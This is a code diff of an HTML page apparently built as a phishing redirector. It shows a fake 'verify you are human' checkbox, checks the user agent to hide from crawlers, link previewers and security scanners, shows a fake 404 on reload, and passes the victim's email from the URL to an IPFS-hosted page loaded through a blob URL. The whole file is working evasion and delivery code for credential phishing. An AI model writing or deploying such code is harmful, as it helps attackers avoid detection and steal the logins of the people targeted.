@@ -1,17 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Secure One-Time Blob Redirect</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure One-Time Blob IPFS Redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
 <style>
     @keyframes spin { from { transform:rotate(0deg);} to {transform:rotate(360deg);} }
     @keyframes rotateRobot { from { transform:rotate(0deg);} to { transform:rotate(360deg);} }
 
-    html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI', Tahoma, sans-serif; }
+    html, body {
+        margin:0; padding:0;
+        width:100%; height:100%;
+        font-family:'Segoe UI', Tahoma, sans-serif;
+    }
     #overlay {
         position:fixed; top:0; left:0; right:0; bottom:0;
-        background:#f0f2f5; display:flex; align-items:center; justify-content:center;
+        background:#f0f2f5;
+        display:flex; align-items:center; justify-content:center;
         opacity:0; transition:opacity 0.3s ease; z-index:99999;
     }
     #verificationBox {
@@ -19,43 +24,54 @@
         width:310px; text-align:left; border:1px solid #dcdcdc;
         box-shadow:0 6px 20px rgba(0,0,0,0.12);
     }
-    #robotIcon { width:32px; height:32px; border-radius:50%; background:#e8f0fe;
-        display:flex; align-items:center; justify-content:center; animation:rotateRobot 2s linear infinite; font-size:20px; }
-    #checkbox { width:26px; height:26px; border:2px solid #7f8fa6; border-radius:4px; cursor:pointer; transition:0.3s; }
-    #verifying { margin-top:18px; display:none; font-size:14px; color:#555; }
-    .spinner { width:16px; height:16px; border-radius:50%; border:3px solid #40739e; border-top-color:transparent; animation:spin 0.6s linear infinite; }
-    #badge { font-size:10px; color:#888; margin-top:18px; text-align:right; opacity:0.7; }
-    iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
-
-    /* Classic Error 404 style */
+    #robotIcon {
+        width:32px; height:32px; border-radius:50%;
+        background:#e8f0fe;
+        display:flex; align-items:center; justify-content:center;
+        animation:rotateRobot 2s linear infinite;
+        font-size:20px;
+    }
+    #checkbox {
+        width:26px; height:26px;
+        border:2px solid #7f8fa6;
+        border-radius:4px;
+        cursor:pointer;
+        transition:0.3s;
+    }
+    #verifying {
+        margin-top:18px;
+        display:none;
+        font-size:14px; color:#555;
+    }
+    .spinner {
+        width:16px; height:16px; border-radius:50%;
+        border:3px solid #40739e;
+        border-top-color:transparent;
+        animation:spin 0.6s linear infinite;
+    }
+    #badge {
+        font-size:10px; color:#888;
+        margin-top:18px;
+        text-align:right;
+        opacity:0.7;
+    }
     .error-404 {
-        display:flex;
-        flex-direction:column;
-        justify-content:center;
-        align-items:center;
-        width:100%;
-        height:100vh;
+        display:flex; flex-direction:column;
+        justify-content:center; align-items:center;
+        width:100%; height:100vh;
         text-align:center;
         font-family:Arial, sans-serif;
-        color:#333;
-        background:#f8f8f8;
+        color:#333; background:#f8f8f8;
     }
-    .error-404 h1 {
-        font-size:96px;
-        margin:0;
-    }
-    .error-404 h2 {
-        font-size:32px;
-        margin:0;
-    }
-    .error-404 p {
-        font-size:18px;
-        color:#555;
-    }
+    .error-404 h1 { font-size:96px; margin:0; }
+    .error-404 h2 { font-size:32px; margin:0; }
+    .error-404 p { font-size:18px; color:#555; }
 </style>
 </head>
+
 <body>
 
+<!-- Anti-Bot Overlay -->
 <div id="overlay">
     <div id="verificationBox">
         <div style="display:flex; align-items:center; gap:12px;">
@@ -73,30 +89,34 @@
 </div>
 
 <script>
+// -------------------------
+// CONFIG
+// -------------------------
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-const ONE_TIME_KEY = "one_time_blob_token";
+const ONE_TIME_KEY = "one_time_blob_used";
 
-// One-time session check
+// -------------------------
+// ONE-TIME CHECK (BLOCK RELOAD / COPY)
+// -------------------------
 if (sessionStorage.getItem(ONE_TIME_KEY)) {
     document.body.innerHTML = `
         <div class="error-404">
-            <h1>404</h1>
-            <h2>Error</h2>
-            <p>The requested page could not be found.</p>
+            <h1>404</h1><h2>Error</h2>
+            <p>The requested link has expired.</p>
         </div>`;
     throw new Error("One-time link already used.");
 }
 
-// Human verification overlay
+// -------------------------
+// ANTI-BOT OVERLAY
+// -------------------------
 function requireVerification() {
     return new Promise(resolve => {
         const overlay = document.getElementById("overlay");
         overlay.style.opacity = 1;
+
         const checkbox = document.getElementById("checkbox");
         const verifying = document.getElementById("verifying");
-
-        checkbox.addEventListener("click", verify);
-        checkbox.addEventListener("touchstart", verify);
 
         function verify() {
             checkbox.style.background = "#40739e";
@@ -105,55 +125,80 @@ function requireVerification() {
 
             setTimeout(() => {
                 overlay.style.opacity = 0;
-                setTimeout(()=>overlay.remove(), 300);
+                setTimeout(() => overlay.remove(), 300);
                 resolve(true);
             }, 1200);
         }
+
+        checkbox.addEventListener("click", verify);
+        checkbox.addEventListener("touchstart", verify);
     });
 }
 
-function getEmail() {
-    return new URLSearchParams(location.search).get("email")||"";
-}
-function buildIPFS(email) {
-    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
-}
-
+// BOT DETECTION
 function isBot() {
     const ua = navigator.userAgent.toLowerCase();
-    const botWords = ["bot","crawl","spider","slurp","fetch","preview","facebook","discord","telegram","linkedin","whatsapp","headless","python","curl","wget","scrapy","phantom","selenium","puppeteer","playwright","httpclient","go-http"];
-    if (botWords.some(x => ua.includes(x))) return true;
-    if (navigator.webdriver && !window._testing) return true;
-    return false; // allow human verification to override bot check
+    const bots = ["bot","crawl","spider","preview","fetch","curl","wget","python","selenium","headless"];
+    return bots.some(b => ua.includes(b)) || (navigator.webdriver && !window._testing);
 }
 
-function showError404() {
+function show404() {
     document.body.innerHTML = `
         <div class="error-404">
-            <h1>404</h1>
-            <h2>Error</h2>
+            <h1>404</h1><h2>Error</h2>
             <p>The requested page could not be found.</p>
         </div>`;
 }
 
-// MAIN
+// -------------------------
+// ORIGINAL BLOB REDIRECT LOGIC
+// -------------------------
+function getEmail() {
+    return new URLSearchParams(location.search).get("email") || "";
+}
+
+function buildIPFS(email) {
+    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
+}
+
+function createBlobHTML(url) {
+    return `
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
+iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
+</style>
+</head>
+<body>
+<iframe src="${url}"></iframe>
+</body>
+</html>`;
+}
+
+// -------------------------
+// MAIN FLOW
+// -------------------------
 document.addEventListener("DOMContentLoaded", async () => {
-    await requireVerification(); // user confirms they are human
 
-    if(isBot()) return showError404(); // bot detection
+    await requireVerification();
 
-    // One-time token
-    const token = crypto.randomUUID();
-    sessionStorage.setItem(ONE_TIME_KEY, token);
+    if (isBot()) return show404();
+
+    // mark one-time used
+    sessionStorage.setItem(ONE_TIME_KEY, "1");
 
     const email = getEmail();
     const ipfsURL = buildIPFS(email);
 
-    // Show content inside iframe
-    const iframe = document.createElement('iframe');
-    iframe.src = ipfsURL;
-    document.body.innerHTML = '';
-    document.body.appendChild(iframe);
+    const blobHTML = createBlobHTML(ipfsURL);
+    const blob = new Blob([blobHTML], { type: "text/html" });
+    const blobURL = URL.createObjectURL(blob);
+
+    // redirect to blob
+    window.location.href = blobURL;
 });
 </script>
 
